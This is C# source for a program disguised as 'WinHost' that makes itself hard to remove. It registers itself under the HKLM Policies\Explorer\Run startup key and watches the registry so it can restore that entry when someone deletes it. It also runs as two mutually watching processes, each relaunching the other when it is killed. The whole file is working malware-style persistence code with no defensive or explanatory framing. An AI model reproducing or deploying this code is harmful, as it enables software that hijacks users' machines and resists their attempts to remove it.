using System;
using System.Diagnostics;

namespace WinHost
{
	class Program
	{
		private const String key = @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run";
		private readonly static string current = System.Reflection.Assembly.GetExecutingAssembly().Location;

		private static int protectingPID;

		static void Main(string[] args)
		{
			StartRegistryMonitor("a suspicious url");
			ProcessArguments(args);
			AddToStartup();
			while (true)
			{
				Process.GetProcessById(protectingPID).WaitForExit();
				ReviveProcess();
			}
		}

		private static void StartRegistryMonitor(string unused)
		{
			RegistryMonitor monitor = new RegistryMonitor(key);
			monitor.RegChangeNotifyFilter = RegChangeNotifyFilter.Value;
			monitor.RegChanged += Monitor_RegChanged;
			monitor.Start();
		}

		private static void ProcessArguments(String[] args)
		{
			if (args.Length == 1)
			{
				if (Int32.TryParse(args[0], out protectingPID)) return;
			}
			ReviveProcess();
		}

		private static void ReviveProcess()
		{
			try
			{
				Process p = Process.Start(current,
										  Process.GetCurrentProcess().Id.ToString());
				protectingPID = p.Id;
			}
			catch (System.ComponentModel.Win32Exception e)
			{
				Environment.Exit(e.ErrorCode);
			}
		}

		private static void Monitor_RegChanged(object sender, EventArgs e)
		{
			try
			{
				if (Microsoft.Win32.Registry.GetValue(key, "Winhost", null) == null)
				{
					AddToStartup();
				}
			}
			catch { }
		}

		private static void AddToStartup()
		{
			try
			{
				Microsoft.Win32.Registry.SetValue(key, "Winhost", current);
			} catch { }
		}
	}
}
